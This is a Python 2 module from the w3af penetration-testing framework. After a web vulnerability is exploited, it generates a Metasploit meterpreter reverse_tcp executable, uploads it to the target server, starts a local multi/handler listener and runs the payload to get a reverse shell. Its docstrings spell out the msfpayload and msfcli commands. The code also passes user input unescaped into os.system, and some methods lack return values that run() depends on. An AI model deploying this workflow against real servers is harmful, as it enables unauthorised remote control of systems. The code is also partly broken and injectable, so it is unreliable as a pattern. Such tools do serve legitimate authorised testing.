'''
vdaemon.py

Copyright 2010 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import core.data.kb.config as cf
import core.data.parsers.urlParser as urlParser

import core.controllers.outputManager as om
from core.controllers.w3afException import w3afException
from core.controllers.payloadTransfer.payloadTransferFactory import payloadTransferFactory
from core.controllers.intrusionTools.execMethodHelpers import getRemoteTempFile

import os
import tempfile
import random
import subprocess


class vdaemon(object):
    '''
    This class represents a virtual daemon that will run metasploit's msfpayload, create an
    executable file, upload it to the remote server, run the payload handler locally and
    finally execute the payload in the remote server. 
    
    This class should be sub-classed by winVd and lnxVd, each implementing a different way
    of sending the metasploit shellcode to the remote web server.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''
    def __init__( self, exec_method ):        
        
        # This is the method that will be used to send the metasploit shellcode to the 
        # remote webserver ( using echo $payload > file )
        self._exec_method = exec_method
        
        self._metasploit_location = cf.cf.getData('msf_location')
        self._msfpayload_path = os.path.join( self._metasploit_location , 'msfpayload' )
        self._msfcli_path = os.path.join( self._metasploit_location , 'msfcli' )
        
                                
    def run(self, user_defined_parameters):
        '''
        This is the entry point. We get here when the user runs the "payload vdaemon linux/x86/meterpreter/reverse_tcp"
        command in his w3af shell after exploiting a vulnerability.
        
        @param user_defined_parameters: The parameters defined by the user, for example, the type of payload to send.
        @return: True if we succeded.
        '''
        
        #
        #    We follow the same order as MSF, but we only allow the user to generate executable files
        #    If the user tries to create a payload for a wrong OS, we'll warn but allow it.
        #
        #    Usage: /opt/metasploit3/msf3/msfpayload <payload> [var=val]
        #
        payload = user_defined_parameters[0]
        parameters = user_defined_parameters[1:]
        
        try:
            executable_file_name = self._generate_exe( payload, parameters )
        except Exception, e:
            raise w3afException( 'Failed to create the payload file, error: "%s".' % str(e) )
        
        try:
            remote_file_location = self._send_exe_to_server( executable_file_name )
        except Exception, e:
            raise w3afException( 'Failed to send the payload file, error: "%s".' % str(e) )
        else:
            om.out.console('Successfully transfered the MSF payload to the remote server.')
            
            #
            #    Good, the file is there, now we launch the local listener and then we execute
            #    the remote payload
            #
            LHOST = 'LHOST=%s' % cf.cf.getData('localAddress')
            
            domain = urlParser.getDomain(cf.cf.getData('targets')[0])
            RHOST = 'RHOST=%s' % domain
            
            handler_parameters = [ LHOST, RHOST ]
            
            if not self._start_local_listener( payload, handler_parameters ):
                om.out.console('Failed to start the local listener for "%s"' % payload)
            else:
                try:
                    self._exec_payload( remote_file_location )
                except Exception, e:
                    raise w3afException('Failed to execute the executable file on the server, error: ' + str(e) )
                else:
                    om.out.console('Successfully executed the MSF payload on the remote server.')
    
    def _start_local_listener(self, payload, parameters ):
        '''
        Runs something similar to:
        
        ./msfcli exploit/multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=192.168.1.112 E
        
        In a new console.
        
        @return: True if it was possible to start the listener in a new console
        '''
        msfcli_command = '%s exploit/multi/handler PAYLOAD=%s %s E' % (self._msfcli_path, payload, ' '.join(parameters) )
        subprocess.Popen( ['gnome-terminal', '-e', msfcli_command] )
    
    def _generate_exe( self, payload, parameters ):
        '''
        This method should be implemented according to the remote operating system. The idea here
        is to generate an ELF/PE file and return a string that represents it.

        The method will basically run something like:
        msfpayload linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8443 X > /tmp/output2.exe
        
        @param payload: The payload to generate (linux/x86/meterpreter/reverse_tcp)
        @param parameters: A list with the parameters to send to msfpayload ['LHOST=1.2.3.4', 'LPORT=8443']
        
        @return: The name of the generated file, in the example above: "/tmp/output2.exe"
        '''
        temp_dir = tempfile.gettempdir()
        randomness = str( random.randint(0,293829839) )
        output_filename = os.path.join(temp_dir, 'msf-' + randomness + '.exe')
        
        command = '%s %s %s X > %s' % (self._msfpayload_path, payload, ' '.join(parameters), output_filename)
        os.system( command )
        
        if os.path.isfile( output_filename ):
            return output_filename
        else:
            raise w3afException('Something failed while creating the payload file.')
        
    def _send_exe_to_server( self, exe_file ):
        '''
        This method should be implemented according to the remote operating system. The idea here is to
        send the exe_file to the remote server and save it in a file.
        
        @param exe_file: The local path to the executable file
        @return: The name of the remote file that was uploaded.
        '''
        om.out.debug('Called _send_exe_to_server()')
        om.out.console('Please wait while w3af uploads the payload to the remote server.')
        
        ptf = payloadTransferFactory( self._exec_method )
        
        # Now we get the transfer handler
        wait_time_for_extrusion_scan = ptf.estimateTransferTime()
        transferHandler = ptf.getTransferHandler()
        
        if not transferHandler.canTransfer():
            raise w3afException('Can\'t transfer the file to remote host, canTransfer() returned False.')
        else:
            om.out.debug('The transferHandler can upload files to the remote end.')

            estimatedTime = transferHandler.estimateTransferTime( len(exe_file) )
            om.out.debug('The payload transfer will take "' + str(estimatedTime) + '" seconds.')
            
            self._remote_filename = getRemoteTempFile( self._exec_method )
            om.out.debug('Starting payload upload, remote filename is: "' + self._remote_filename + '".')
            transferHandler.transfer( exe_file, self._remote_filename )
        
        om.out.console('Finished payload upload.')
        
    def _exec_payload( self, remote_file_location ):
        '''
        This method should be implemented according to the remote operating system. The idea here is to
        execute the payload that was sent using _send_exe_to_server and generated by _generate_exe . In lnxVd
        I should run "chmod +x file; ./file"
        
        This method should be implemented in winVd and lnxVd.
        '''
        raise w3afException('Please implement the _exec_payload method.')

    def _exec( self, command ):
        '''
        A wrapper for executing commands
        '''
        om.out.debug('Executing: ' + command )
        response = apply( self._exec_method, ( command ,))
        om.out.debug('"' + command + '" returned: ' + response )
        return response
